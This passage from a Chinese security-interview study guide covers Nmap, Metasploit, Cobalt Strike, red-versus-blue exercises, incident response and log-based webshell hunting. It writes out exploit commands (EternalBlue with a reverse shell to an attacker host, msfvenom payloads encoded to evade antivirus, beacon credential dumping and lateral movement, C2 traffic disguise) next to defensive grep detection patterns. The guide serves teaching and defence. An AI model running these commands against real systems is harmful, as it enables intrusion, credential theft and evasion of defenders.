- `-oX scan.xml`：XML 格式（供 Metasploit 导入）
- `-oG grepable.txt`：可 grep 格式
- `-oA all`：所有格式

**实战组合**：
- 内网快速扫描：`nmap -sS -Pn -T4 -p 1-65535 --open -oA target target_ip/24`
- Web 服务深度：`nmap -sV -sC -p 80,443 --script=http-enum,http-title,http-headers,ssl-cert target`
- SMB 漏洞扫描：`nmap --script=smb-vuln-* -p 445 target`
- 全网段扫描：masscan + nmap 结合

**解析**：

考察意图：Nmap 是渗透工程师的瑞士军刀，必问工具。回答要点：要展示对各类扫描原理的理解而非只记命令。易错点：只记 -sS 不知其他扫描方式。面试官想听到：能详细解释 SYN 扫描为什么不完成三次握手（不建立完整连接，速度快且目标不记录到日志）、NSE 脚本引擎的工作原理（Lua 脚本 + 丰富内置库）、不同扫描方式对应的 IDS 规避效果。

**考察知识点**：

- SYN 半开扫描原理
- NSE 脚本 14 个分类
- -sV 版本探测指纹
- 时序 -T 控制扫描速度

---


---

### 第 31 天（精讲） ★★★ Metasploit Framework 核心模块与使用流程


**主题**：工具使用 / Metasploit

**答案**：

Metasploit Framework（MSF）是渗透测试事实标准工具，由 Rapid7 维护，集成了 700+ 漏洞 exploit、2000+ payload、500+ 辅助模块。

**1. 架构组成**：
- msfconsole：主交互控制台
- modules：模块库
  - exploits：漏洞利用代码
  - payloads：攻击载荷（meterpreter、shell、reverse_tcp 等）
  - auxiliary：辅助模块（扫描/嗅探/DoS）
  - post：后渗透模块
  - encoders：编码器（shikata_ga_nai 等）
  - nops：空指令填充
- msfdb：PostgreSQL 数据库存储结果

**2. 核心流程**：
```bash
msfconsole              # 启动
search type:exploit name:smb    # 搜索模块
use exploit/windows/smb/ms17_010_eternalblue   # 加载
show options            # 查看参数
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit / run          # 执行
```

**3. Payload 分类**：
- singles：单文件，独立运行（windows/shell_reverse_tcp）
- stagers：分阶段下载（windows/shell/reverse_tcp）
- stages：完整功能体（meterpreter）
- meterpreter：高级 payload，支持进程注入、键盘记录、文件操作、路由转发

**4. Meterpreter 核心命令**：
```
sysinfo                 # 系统信息
getuid                  # 当前用户
getsystem               # 提权到 SYSTEM
hashdump                # 抓密码 hash
upload/download         # 文件传输
shell                   # 进入 cmd
execute                 # 执行程序
migrate                 # 进程迁移
portfwd                 # 端口转发
route                   # 路由
screenshot              # 截图
keyscan_start/stop_dump # 键盘记录
background              # 后台会话
session -i N            # 进入会话
```

**5. 后渗透模块（post/）**：
- post/windows/gather/enum_applications
- post/windows/gather/credentials/credential_collector
- post/multi/recon/local_exploit_suggester
- post/windows/manage/persistence_exe（持久化）

**6. 实战组合**：
- MS17-010（永恒之蓝）+ meterpreter + mimikatz
- MS08-067（XP/2003 经典）+ reverse_tcp
- Struts2/S2-045 → 反弹 shell
- Tomcat 管理弱口令 → war 包部署
- JBoss/反序列化 → shell

**7. 资源文件（.rc）自动化**：
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit -j
sessions -i 1
```
保存为 `auto.rc`，`msfconsole -r auto.rc`

**8. 编码与免杀**：
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe`
- 多重编码 + 分段 + 加壳（UPX / VMP / Themida）
- 分离免杀（loader + payload）

**9. 数据库联动**：
- `msfdb init` / `reinit`
- `db_nmap` 扫描自动入库
- hosts / services / loots / notes 表
- workspace 切换

**面试追问**：
- 永恒之蓝原理？答：SMBv1 缓冲区溢出，445 端口
- meterpreter vs nc 反弹区别？答：meterpreter 支持加密 + 进程注入 + 模块化扩展
- msfvenom 常用参数？答：-p payload -e encoder -i 次数 -f 格式 -o 输出

**解析**：

考察意图：MSF 是面试送分题。回答要点：架构 + meterpreter 命令 + 利用链。易错点：说不清 payload 类型区别。面试官想听到：能讲清 exploit / payload / auxiliary / post 四模块、meterpreter 高级特性（迁移/键盘记录/路由）、msfvenom 免杀基础。

**考察知识点**：

- exploit / payload / post 四模块
- meterpreter 核心命令
- msfvenom 生成 + 编码
- 资源文件自动化

---


---

### 第 32 天（精讲） ★★★ Cobalt Strike 使用与 CS 反制方法


**主题**：工具使用 / Cobalt Strike

**答案**：

Cobalt Strike（CS）是商业红队 C2（Command and Control）框架，3.7K$/年 license，护网红队标配。

**1. 架构**：
- TeamServer：服务端（控制端+监听），Linux/Windows
- Client：客户端 GUI（Java），可多个红队成员协作
- Beacon：植入目标机的代理（dll/exe/ps1/vba/macho）
- Profile：Malleable C2 配置文件（伪装流量）
- Aggressor Script：脚本引擎（JavaScript 变种）

**2. 部署**：
```bash
./teamserver <IP> <password> [/path/to/profile.profile]
./cobaltstrike        # 客户端启动
```

**3. 监听器（Listener）**：
- `windows/beacon_http` HTTP 上线
- `windows/beacon_https` HTTPS 加密
- `windows/beacon_dns` DNS 隧道
- `windows/beacon_smb` SMB 命名管道（内网横向）
- `windows/foreign` 外部监听（对接 MSF）
- DNS Beacon 慢但穿透强

**4. Beacon 类型**：
- HTTP/HTTPS Beacon：最常用
- DNS Beacon：隧道穿透，但慢
- SMB Beacon：内网横向（不出网）
- TCP Beacon：CS to CS

**5. 攻击功能**：
- Packages：
  - Windows Executable（exe）
  - Windows DLL
  - PowerShell Command
  - VBA Macro（钓鱼）
- 钓鱼攻击：邮件 + 附件 + Office 宏
- 投递：通过 CVE、钓鱼、Webshell
- 后渗透：
  - dump hash（mimikatz）
  - 横向移动（psexec/wmi/smb）
  - 令牌窃取（steal_token）
  - 进程注入（inject）
  - 屏幕截图 + socks 代理

**6. 核心命令**：
```
beacon> sleep 60       # 休眠时间（默认 60 秒）
beacon> shell whoami
beacon> hashdump
beacon> logonpasswords  # 调用 mimikatz
beacon> ps
beacon> inject <pid> <arch> <listener>   # 进程注入
beacon> spawn x64 <listener>             # 新建进程
beacon> psexec \\target powershell
beacon> jump psexec64 \\target smb       # 横向
beacon> socks 1080                       # 代理
beacon> rdesktop \\target                # 远程桌面
beacon> download/upload
beacon> exit
```

**7. Malleable C2（流量伪装）**：
```
http-get {
    set uri "/api/v1/status";
    client {
        header "Host" "cdn.cloudflare.com";
        header "Accept" "application/json";
    }
    server {
        header "Content-Type" "application/json";
    }
}
```
通过 Profile 将 C2 流量伪装为正常业务（如 CDN、API）。

**8. CS 反制（蓝队）**：
- 流量特征检测：默认 CS 证书（沃通）、心跳包周期、Jitter、AES 加密常数、URI 特征
- 工具识别：
  - BeaconEye：扫描 CS 证书
  - ThreatHunting：流量分析
  - C2Check：流量基线
- 反制 POC：CS 4.0 前有反序列化漏洞，蓝队可投递 Payload 给 CS TeamServer 反控
- CS 4.7+ 反反制：Sleep Mask 混淆内存、Artifact Kit 重编译
- 进程检查：beacon 默认调用 powershell、cmd 后留下日志

**9. 护网检测 CS 要点**：
- 检测 sleep+jitter 后的周期性流量
- TLS 证书 SHA1 指纹黑名单（CS 默认证书）
- DNS Beacon 特征（长随机子域名查询）
- 命令执行特征：mimikatz lsadump、sekurlsa
- 进程链：rundll32.exe 无参数 + 网络连接

**10. 替代品**：
- 开源：Empire、Sliver、Metasploit C2、Mythic
- 商业：Brute Ratel C4、Outflank C2、Nighthawk
- 国内：N1nj4Sec C2、Viper（CS 魔改）

**解析**：

考察意图：CS 是护网红队身份象征。回答要点：架构 + Beacon 类型 + 反制。易错点：只知攻击不知反制。面试官想听到：能讲清 Malleable C2 伪装原理、CS 4.0 反序列化漏洞反制、默认证书指纹（沃通 CA）、Beacon sleep/jitter 特征。

**考察知识点**：

- Beacon HTTP/HTTPS/DNS/SMB
- Malleable C2 流量伪装
- CS 反制：证书指纹 + 反序列化
- 护网 CS 检测特征

---


---

### 第 33 天（精讲） ★★★ 护网行动红蓝队分工与流程


**主题**：安全运营与合规 / HW 护网

**答案**：

护网行动（HW）是国家级网络安全攻防演练：

**红队（攻击方）**：
1. 任务：模拟 APT 攻击，攻击防守方系统
2. 组成：
   - 总指挥：项目协调
   - 攻击队：实际渗透（HWer）
   - 情报组：资产/漏洞收集
   - 后勤：技术支持
3. 攻击场景：
   - 外网打点 → 突破边界
   - 内网横向 → 拿下核心业务
   - 敏感数据获取
4. 成果提交：战果截图证据、攻击路径说明、利用代码 POC

**蓝队（防守方）**：
1. 任务：保护系统不被攻陷，发现并处置攻击
2. 组成：
   - 监测组：7×24 SOC 监控
   - 研判组：分析告警真假
   - 处置组：断网/隔离/封堵
   - 溯源组：反制攻击者
3. 工作流程：情报收集 → 资产清点 → 漏洞修复 → 监控加强 → 应急响应
4. 评分机制：发现告警 +分 / 误报 -分 / 被攻陷 -大量分 / 反制成功 +大量分

**紫队（协调方）**：
1. 任务：组织协调、规则制定、结果评判
2. 关键作用：制定攻击/防守规则、争议裁决、分数评定
3. 不参与实际攻防

**典型时间线（X+1 周攻防）**：
- 准备期：资产清点 + 防护加固 + 应急演练
- 演练期（5-7 天）：
  - Day 1-2：外网打点
  - Day 3-4：内网横向
  - Day 5：成果提交
- 复盘期：总结 + 报告 + 改进

**护网高频考点（基于 2022 护网题库）**：
1. 外网打点流程：FOFA / Shodan + Log4j / Shiro / Fastjson / Struts2 / ThinkPHP
2. CDN 识别绕过：多地 Ping、历史 DNS、邮件头
3. 水坑 + 鱼叉攻击：定向邮件 + 常访问网站
4. 未授权访问：Redis / MongoDB / Memcache
5. 3389 无法连接排查
6. MSSQL / Redis / 反向 shell 命令
7. 中间件漏洞：IIS / Apache / Nginx / Tomcat / JBoss / WebLogic
8. WebShell 检测：D 盾 / 河马
9. 应急响应思路
10. 蓝队反制：蜜罐 + IP 画像 + 反渗透

**反制技术**：
1. 蜜罐捕获（Honeypot）
2. CS 反制：利用 Beacon 漏洞反控 CS
3. IP 画像：WHOIS + 威胁情报
4. 社交画像：ID 关联
5. 工具识别：mimikatz / CS 特征
6. 法律武器：协同司法取证

**护网常用工具**：
- 红队：CS / MSF / Burp / Goby
- 蓝队：Hfish 蜜罐 + ELK / 墨菲 / 360 态势感知
- 共用：Wireshark / Sysmon / ProcessMonitor

**护网面试常见问题**：
- 你做过几次护网？
- 打过什么目标？
- 取得什么成果？
- 如何反制攻击者？
- 蓝队告警如何研判？

**解析**：

考察意图：HW/护网经验是中国安全市场核心。回答要点：分红蓝紫三队+流程。易错点：只说红蓝忽视紫队协调。面试官想听到：能详细说明护网高频漏洞（Log4j / Shiro / Fastjson 几乎是必考点）、蓝队反制方法（蜜罐 + 画像 + CS 反制）、评分机制（避免只知攻不知防）。

**考察知识点**：

- 红蓝紫三队分工
- 护网高频漏洞 Log4j / Shiro / Fastjson
- 蓝队反制蜜罐 + CS 反控
- 评分机制 + 研判处置

---


---

### 第 34 天（精讲） 红队攻击思路
**主题**：护网行动 / 红蓝对抗 / 攻击方

**答案**：

红队模拟真实攻击者，目标是在授权范围内拿下靶标系统。完整思路分为 **5 个阶段**。

**1. 外网资产测绘**：

**信息收集维度**：
- **资产**：域名、子域（OneForAll/subfinder）、C 段（masscan）、旁站（基于同 IP/SSL 证书）、真实 IP（绕 CDN）。
- **服务**：端口、服务版本（nmap）、Web 指纹（CMS/框架/中间件）、WAF 类型。
- **人员**：whois、备案、邮箱、GitHub 泄露、社工库关联。
- **技术**：目录扫描（dirsearch）、敏感文件（.git/.svn/phpinfo）、JS 接口、Swagger、未授权 API。
- **空间引擎**：fofa/quake/hunter/shodan/censys。

**找到突破口**：
- 暴露面广 → 优先外网突破
- 暴露面窄 → 钓鱼 + 社工 + 供应链
- 完全隔离 → 物理渗透（需特别授权）

**2. Web 突破**（最常用）：

```
信息收集
  ↓
漏洞扫描（AWVS/Nessus/xray）
  ↓
手动验证 + 业务逻辑漏洞（越权/支付）
  ↓
利用漏洞（SQLi/上传/反序列化/RCE）
  ↓
拿 webshell → 提权 → 权限维持
```

**常见利用**：
- 0day / 1day（NDay）
- 已知组件漏洞（Log4j/Struts2/Shiro）
- 业务逻辑漏洞（越权/支付/验证码）
- 上传 + 解析漏洞（组合拳）

**3. 钓鱼**：

**邮件钓鱼**：
- 伪造发件人（`MailFrom` 头或 SMTP 中继）
- 携带附件：Office 宏、CHM 帮助文件、LNK 快捷方式、ISO/IMG 镜像
- 钓鱼链接：假冒登录页（OA/邮箱/CRM）
- 投递时机：工作日上午 9-10 点（最高点击率）

**IM 钓鱼**：
- 企业微信/钉钉假冒客服
- 微信群仿冒管理员
- QQ 群冒充 HR

**供应链钓鱼**：
- 假冒供应商发邮件
- 软件更新劫持（CDN/域名劫持）
- GitHub 项目投毒（typosquatting）

**4. 内网横向**（详见 D23/D30）：

```
边界机上线
  ↓
本机信息收集（whoami/ps/网络/凭证）
  ↓
提权（Windows/Linux 漏洞）
  ↓
内网存活 + 端口扫描（arp/nbtscan/nmap）
  ↓
凭据复用 + PtH + Kerberos 攻击
  ↓
横向（psexec/WinRM/SSH）
  ↓
域控（DCsync + Golden Ticket）
  ↓
核心数据
```

**5. 隐蔽**：

**流量层面**：
- HTTPS + 合法证书
- Malleable C2 Profile（CS）+ 域前置
- DNS Beacon
- 流量时间随机化（sleep + jitter）

**主机层面**：
- 进程注入（合法进程派生 shellcode）
- 内存马（Java Filter/Servlet，无文件）
- Token 盗用（mimikatz incognito）
- AMSI/ETW 绕过（杀软免杀）

**文件层面**：
- 文件名伪装（与系统文件同名前缀）
- 隐藏属性（Windows 隐藏 + 系统）
- 时间戳修改（`touch -r`）

**行为层面**：
- 避免频繁操作（人为 sleep）
- 不主动触发告警
- 不访问与靶标无关的资产

**6. 纪律**：

**护网合规底线**（红线）：
- ❌ 不触碰非靶标系统
- ❌ 不破坏业务（DoS）
- ❌ 不拖库（如需数据样本，与监管沟通）
- ❌ 不公开漏洞细节（报告中）
- ❌ 不触碰关键基础设施（医院/铁路/航空/电力）
- ❌ 不向无关人员透露测试信息

**7. 红队常用工具链**：

| 阶段 | 工具 |
|------|------|
| 资产测绘 | fofa/quake/hunter/OneForAll |
| 漏洞扫描 | xray/AWVS/Nessus |
| 漏洞利用 | Burp/Sqlmap/MSF |
| 凭据 | mimikatz/rubeus/CrackMapExec |
| 横向 | impacket/CrackMapExec/SharpHound |
| C2 | Cobalt Strike/Sliver/Havoc |
| 权限维持 | 计划任务/服务/启动项 |
| 隐蔽 | Malleable C2/域前置/DNS Beacon |
| 报告 | 定制化模板 + 时间线可视化 |

**解析**：

考察意图：考察护网红队实战能力。回答要点：5 阶段流程 + 工具链 + 隐蔽手段 + 纪律红线。易错点：只说"渗透测试步骤"不讲隐蔽与纪律。面试官想听到：能讲清"资产测绘→突破→横向→隐蔽→拿分"完整链路、明白 Malleable C2 + 域前置的隐蔽手段、了解护网"不触碰非靶标"的纪律。

**考察知识点**：
- 红队 5 阶段（资产测绘→Web 突破→钓鱼→内网横向→隐蔽）
- 常见利用组合（0day + 已知组件 + 业务逻辑）
- 隐蔽手段（流量/主机/文件/行为四层）
- 护网合规红线（不触碰非靶标/不破坏/不拖库）
- 工具链（测绘/扫描/利用/凭据/横向/C2）

### 第 35 天（精讲） 蓝队监测防守思路
**主题**：护网行动 / 蓝队防守 / 监测响应

**答案**：

蓝队核心是"**看见 + 阻断 + 溯源**"三位一体。

**1. 监测体系**：

**流量层**：
- 全流量探针（镜像核心交换机流量）
- 入侵检测系统（IDS，旁路监听）
- 入侵防御系统（IPS，串行阻断）
- Web 应用防火墙（WAF）
- 网络流量分析（NTA / NDR）

**主机层**：
- EDR（终端检测响应）
- 主机入侵检测（HIDS，如 OSSEC、Wazuh）
- 进程监控（Sysmon + 集中日志）
- 文件完整性监控（FIM）

**应用层**：
- Web 日志（Nginx/Apache/IIS access/error）
- 应用日志（业务日志）
- 中间件日志（Tomcat/WebLogic）
- 数据库审计（MySQL/MSSQL 审计日志）

**集中层**：
- SIEM（安全信息与事件管理）— Splunk/ELK/QRadar
- 日志聚合（Filebeat/Logstash）
- 关联分析（规则引擎 + UEBA）
- 告警分级（高/中/低）

**2. 告警研判**：

**研判流程**：
```
告警产生
  ↓
自动富化（IP 情报/资产标签/历史）
  ↓
关联上下文（同一 IP 多次告警/同一资产历史告警）
  ↓
人工分析（payload / 时间 / 行为链）
  ↓
确认真实攻击 or 误报
  ↓
真实 → 处置；误报 → 调优规则
```

**研判要点**：
- **payload 分析**：看攻击载荷（SQL/XSS/命令）。
- **源 IP 情报**：是否已知威胁 IP（ThreatBook/MicroSoft TI）。
- **资产重要性**：核心系统 vs 测试环境（同样攻击处置优先级不同）。
- **行为链**：单点告警 vs 持续攻击（如多个端点告警 → 横向攻击）。
- **时间**：工作时间 vs 非工作时间。
- **频率**：单次 vs 高频扫描 vs 持续攻击。

**3. 处置闭环**：

**紧急处置**（分钟级）：
- 封禁 IP（防火墙/WAF）
- 隔离主机（断网/禁用账号）
- 阻断端口（关闭服务/防火墙规则）

**临时处置**（小时级）：
- 修补漏洞（关闭服务/应用补丁）
- 加固配置（密码策略/最小权限）
- 关闭功能（禁用管理后台）

**永久处置**（天/周级）：
- 升级补丁
- 架构调整（网络隔离/零信任）
- 安全加固基线（基线扫描）

**复盘**：
- 事件时间线
- 根因分析
- 加固建议
- 规则调优（避免再误报）

**4. 反制手段**：

**溯源**：
- 攻击者画像（IP 地理位置、UA、工具特征、行为习惯）
- 攻击链还原（从告警反向还原完整路径）
- 威胁情报关联（已知 APT 组织 TTPs）
- 法律手段（报案 + 配合警方）

**蜜罐反制**：
- 部署蜜罐（高交互蜜罐/低交互蜜罐）
- 主动诱捕（暴露假漏洞/假数据）
- 攻击者画像（收集攻击者行为）
- 反向追踪（通过钓鱼/JS 探针获取攻击者真实 IP）

**合规反制**：
- 仅在法律授权范围内反制
- 蜜罐获取的攻击者信息可作为法律证据
- 避免"以攻对攻"违法

**5. 蓝队日常工具**：

| 类别 | 工具 |
|------|------|
| SIEM | Splunk/ELK/QRadar/IBM Resilient |
| EDR | CrowdStrike/SentinelOne/360 天擎/火绒 EDR |
| IDS/IPS | Suricata/Snort/科来/启明星辰 |
| WAF | ModSecurity/雷池/OpenResty + lua |
| HIDS | OSSEC/Wazuh/Elkeid |
| 蜜罐 | HFish/T-Pot/Cowrie/Dionaea |
| 流量分析 | Wireshark/NetworkMiner/Bro/Zeek |
| 应急 | Velociraptor/Kansa/火绒剑 |
| 取证 | Autopsy/FTK/Volatility |

**6. 护网蓝队特有工作**：

**前期**：
- 资产清点（IP/域名/系统/责任人）
- 漏洞排查 + 修复（高危优先）
- 演练剧本（针对常见攻击场景）
- 值班表（7×24）
- 应急联系链（安全负责人/运维/业务/领导）

**中期**：
- 7×24 监测
- 告警实时研判
- 高危事件 1 小时处置
- 每日汇报（统计+重要事件）

**后期**：
- 事件复盘
- 攻击画像（攻击方 IP/TTPs）
- 加固建议（按事件类型汇总）
- 改进措施（监测/响应/工具）

**7. 告警分类与响应时效**：

| 告警级别 | 含义 | 响应时效 |
|---------|------|---------|
| 紧急/红色 | 正在发生的高危攻击（RCE/拖库/横向） | 5 分钟内处置 |
| 高危/橙色 | 严重漏洞利用/高危操作 | 1 小时内处置 |
| 中危/黄色 | 可疑行为/中等漏洞 | 4 小时内处置 |
| 低危/蓝色 | 信息泄露/弱口令 | 24 小时内处置 |

**8. 蓝队能力模型**：

| 能力 | 描述 | 工具 |
|------|------|------|
| 监测 | 全流量 + 终端 + 日志 | 探针 + EDR + SIEM |
| 研判 | 区分误报 vs 真实攻击 | 威胁情报 + 行为分析 |
| 处置 | 封禁/隔离/阻断 | 防火墙 + EDR |
| 溯源 | 还原攻击链 + 攻击者画像 | 取证工具 + 情报 |
| 反制 | 蜜罐 + 法律手段 | HFish + 法务 |

**解析**：

考察意图：考察护网蓝队实战能力。回答要点：监测体系 + 研判 + 处置 + 反制 + 工具链。易错点：只说"看日志"。面试官想听到：能讲清"看见+阻断+溯源"三位一体、明白告警研判是核心能力（区分误报 vs 真实）、知道蜜罐反制在护网中的应用、了解告警分级响应时效。

**考察知识点**：
- 蓝队三位一体（看见+阻断+溯源）
- 监测体系（流量/主机/应用/集中四层）
- 告警研判流程（富化+关联+分析）
- 处置闭环（紧急/临时/永久）
- 反制手段（溯源+蜜罐+合规）
- 告警分级与响应时效

### 第 36 天（精讲） ★★★★★ 应急响应完整思路与流程


**主题**：应急响应与取证 / 应急响应

**答案**：

应急响应是处理安全事件的标准流程：

**NIST 应急响应生命周期**：

**1. 准备阶段（Preparation）**：
- 安全团队组建 + 值班制度
- 应急预案制定
- 工具预置（沙箱、流量分析、磁盘镜像）
- 威胁情报订阅

**2. 检测与分析（Detection & Analysis）**：
- 监控告警：SIEM / IPS / EDR
- 事件定级：P0-P4（核心系统沦陷 / 数据泄露 / 普通入侵 / 扫描 / 误报）
- 初步分析：攻击类型 + 影响范围 + 入侵时间

**3. 遏制、根除和恢复（Containment, Eradication & Recovery）**：
- 遏制：
  - 网络层：断网隔离、ACL 阻断
  - 主机层：禁用账号、停服
  - 业务层：降级运行保障核心
- 根除：
  - 清除 WebShell / 后门账号 / 恶意进程
  - 修补漏洞（升级 / 补丁 / 配置）
  - 重置所有可能泄露的凭证
- 恢复：
  - 备份恢复 + 完整性校验
  - 加固上线（最小权限 + 补丁）
  - 监控加强一段时间

**4. 事后活动（Post-Incident Activity）**：
- 复盘报告：时间线 + 攻击路径 + 根因 + 改进
- IOC 提取：IP / 域名 / Hash / 工具特征
- 威胁情报共享
- 安全策略优化

**主机入侵排查清单**：
1. 网络连接：`netstat -antp` / `arp -a` / `ss -tulnp`
2. 可疑进程：`ps aux` / `tasklist` / `wmic process`
3. 账号安全：`net user` / `cat /etc/passwd` / `lastb`
4. 开机启动：
   - Windows：注册表 Run 键、计划任务、服务
   - Linux：crontab、`/etc/init.d`、systemd
5. 日志分析：
   - Windows：`eventvwr.msc`（4624 / 4625 / 4720 / 7045）
   - Linux：`/var/log/auth.log`、`secure`、`wtmp`、`messages`
6. 文件异常：`find /tmp /var/tmp`、文件时间戳、隐藏文件
7. WebShell：扫描工具 D 盾 / 河马、文件哈希

**溯源取证**：
- IP 画像：WHOIS 历史 / 威胁情报
- 工具识别：mimikatz / CS / Empire 特征
- 样本同源：同家族关联
- 社交画像：QQ / 微博 / Github ID

**解析**：

考察意图：考察应急响应方法论，是 SOC/蓝队岗位核心问题。回答要点：要按 NIST 4 阶段展开 + 具体排查动作。易错点：把应急响应简化为"杀进程 + 删文件"。面试官想听到：能详细列出主机入侵排查的具体命令（netstat / ps / tasklist）、Windows 事件日志关键 ID（4624 / 4625 / 4720）、Linux 关键日志路径（auth.log / secure / wtmp）。

**考察知识点**：

- NIST 4 阶段应急响应
- 主机入侵排查清单
- Windows 事件日志 4624 / 7045
- IOC 提取 + 威胁情报

---


---

### 第 37 天（精讲） ★★★ Web 日志分析定位 WebShell 与入侵痕迹


**主题**：应急响应与取证 / Web 日志分析

**答案**：

Web 日志分析是应急响应核心技能，从 Apache / Nginx / IIS 日志中还原攻击链。

**1. 日志格式**：
Nginx：
```
$remote_addr - $remote_user [$time_local] "$request" $status $bytes "$referer" "$user_agent"
```
例：`192.168.1.10 - - [22/Sep/2024:10:23:45 +0800] "GET /index.php?id=1' UNION SELECT 1,2,3-- - HTTP/1.1" 200 1234 "-" "Mozilla/5.0"`

**2. 分析工具链**：
- 命令行：grep / awk / sed（必会）
- GoAccess：实时 Web 日志分析
- ELK Stack：Elasticsearch + Logstash + Kibana
- Splunk：商业 SIEM
- AWStats / Webalizer：日志统计

**3. 常见入侵痕迹排查**：

**A. SQL 注入痕迹**：
```bash
grep -i "union\|select\|concat\|0x\|benchmark" access.log
grep -E "(%27|')" access.log | grep -iE "union|select"
```
关注：union、select、concat、sleep、benchmark、xp_cmdshell

**B. WebShell 访问痕迹**：
```bash
grep -iE "\.php\?.*=.*(eval|exec|system|assert)" access.log
grep -E "(eval|assert|base64_decode)" access.log
grep -iE "\.php\?[a-z]+=" access.log | grep -v "google\|bing"   # 可疑参数
```
关注：访问 .php?a=eval(...) 类请求、POST 长参数

**C. WebShell 上传痕迹**：
```bash
grep -i "upload\|fileupload\|writefile\|move_uploaded" access.log
grep " 200 " access.log | grep -iE "\.(jsp|asp|aspx|php)$"  # 上传后访问
```

**D. 扫描器痕迹**：
```bash
grep -E "(sqlmap|nikto|nmap|masscan|wpscan|acunetix|nessus)" access.log   # UA
grep -E "(\.env|\.git|robots\.txt|phpmyadmin|admin)" access.log         # 探测路径
```

**E. 暴力破解**：
```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20   # 高频 IP
awk '/POST.*login/{print $1}' access.log | sort | uniq -c | sort -rn | head -20   # 登录高频 IP
grep " 401 " access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20   # 401 错误高频 IP
```

**F. 反弹连接**：
- WebShell 出网通常走 bash / python / perl
- 检查服务器出站连接：`netstat -an | grep ESTABLISHED`

**4. WebShell 文件查找**：

**A. 时间窗匹配（日志中首次上传时间）**：
```bash
find /var/www -type f -newermt "2024-09-22 10:00" ! -newermt "2024-09-22 11:00"
```

**B. 特征匹配**：
```bash
grep -rE "(eval|assert|base64_decode|gzinflate|str_rot13|\$_(GET|POST|REQUEST))" /var/www/*.php
grep -rE "(JspSpy|wscript|cmd\.exe|ShellExcute)" /var/www/*.jsp
```

**C. 文件静态特征（D 盾/河马）**：
- WebShell 检测工具特征库（基于 opcode、混淆模式）
- 文件大小异常（极小或极大）
- 创建时间在业务上线后
- 文件属主异常（www-data 创建的 shell 脚本）

**D. PHP 危险函数扫描**：
```bash
grep -rE "\b(eval|assert|create_function|preg_replace)\b" /var/www/
```

**E. 文件完整性**：
- AIDE / Tripwire 对比基线哈希
- Git 版本对比

**5. 取证深度分析**：

**A. 隐藏 WebShell**：
- 无文件 WebShell（.htaccess 注入 PHP 代码）
- 内存 WebShell（Java Agent、PHP OPcache）
- 数据库 WebShell（MySQL INTO OUTFILE）
- 计划任务 WebShell（crontab 反弹）

**B. 检测技巧**：
- .htaccess 异常重写规则
- `find / -perm -u+s`（SUID）
- `crontab -l` + `/var/spool/cron/`
- `/etc/rc.local` / `/etc/init.d/` 异常服务
- /tmp /var/tmp 可执行文件

**C. 时间线分析（Timeline）**：
- 文件创建时间
- 进程启动时间
- 网络连接时间
- 日志时间
- 用 Plaso / log2timeline 统一时间轴

**6. 应急响应 SOP（Web 入侵）**：
1. 隔离：断网 / IP 黑名单
2. 备份：磁盘镜像、内存镜像
3. 取证：抓 webshell + 日志
4. 溯源：攻击者 IP、漏洞点、攻击路径
5. 清除：删 webshell、修复漏洞、改口令
6. 加固：补丁、最小权限、WAF 规则
7. 复盘：写报告、修补流程

**面试追问**：
- 如何从日志定位 0day 攻击？答：找异常 UA、异常请求方法、大文件 POST
- 时间线如何统一？答：用 log2timeline / Plaso 工具以 MAC 时间 + mtime + 日志时间
- 如何避免日志被清理？答：远程 syslog、ELK 集中、双写日志

**解析**：

考察意图：日志分析是 IR 基础。回答要点：命令 + WebShell 检测 + 时间线。易错点：只背命令不分析。面试官想听到：能讲清无文件 WebShell（.htaccess / 计划任务 / memory）、日志集中化（防被清）、plaso 时间线分析。

**考察知识点**：

- 日志特征匹配命令
- 无文件 WebShell 检测
- 时间线取证
- 日志集中化防篡改

---


---

### 第 38 天（精讲） 溯源反制思路
**主题**：蓝队 / 应急响应 / 取证溯源

**答案**：

溯源是从告警反向还原攻击链；反制是在合规框架内对攻击者进行反向追踪。

**1. 溯源流程**：

**Step 1：告警收集与关联**
- 同一源 IP 的所有告警时间线
- 同一资产的告警时间线
- 多源告警关联（IDS+EDR+WAF）

**Step 2：攻击链还原**
```
攻击者 → 入口（钓鱼/外网突破）
  ↓
初始访问 → webshell/RCE
  ↓
权限提升（提权）
  ↓
凭证窃取（mimikatz/注册表）
  ↓
内网横向
  ↓
目标达成（数据/域控）
```

每一步关联证据：日志、流量样本、内存 dump、文件系统变更。

**Step 3：攻击者画像**

| 维度 | 方法 |
|------|------|
| IP | 微步/ThreatBook/VirusTotal/ThreatCrowd |
| UA | User-Agent 字符串分析（工具特征） |
| 工具 | payload 特征（sqlmap/Burp/MSF） |
| 时间 | 攻击时段（推断时区） |
| 语言 | 钓鱼邮件/聊天记录语言习惯 |
| 资源 | C2 IP 归属、域名 whois |
| 样本 | 样本分析（VT 上传 + 沙箱） |
| 行为 | TTPs（与 ATT&CK 比对） |

**Step 4：威胁情报关联**
- 同源 IP 历史告警（是否老对手）
- 同 TTP 历史事件（APT 组织常用手法）
- 同 C2 域名/IP 历史事件
- 关联其他厂商/社区的情报

**Step 5：法律层面**
- 完整证据链（可作为报案材料）
- 与公安机关/网安部门联动
- 配合调查取证

**2. 反制手段**（合规框架内）：

**蜜罐反制**：

| 蜜罐类型 | 工具 | 价值 |
|---------|------|------|
| 低交互 | Cowrie（Dionaea） | 收集攻击者扫描/爆破 |
| 中交互 | Honeyd/Glastopf | 模拟服务漏洞 |
| 高交互 | T-Pot（多蜜罐平台） | 收集高级威胁 |
| Web 蜜罐 | HFish/StrutsHoneypot | Web 攻击画像 |
| 邮件蜜罐 | mailoney/haraka | 钓鱼反制 |

**蜜罐部署要点**：
- 隔离环境（避免被用作跳板）
- 真实模拟（看起来像生产系统）
- 完整日志（攻击者所有操作）
- 合法授权（合规前提）

**JS/钓鱼反制**（仅限授权）：
- 在伪造页面埋 JS 探针（获取攻击者真实 IP/UA/浏览器指纹）
- 假文件投毒（含恶意 Office 宏文件 → 反弹 C2）

**主动反制**（极少用）：
- 反向 DDoS（**禁止**，违法）
- 反向 RCE（仅限授权+法律备案）

**3. 典型溯源案例**：

**案例 1：钓鱼邮件溯源**
1. 受害者收到钓鱼邮件 → 发件人 IP 是伪造的中转
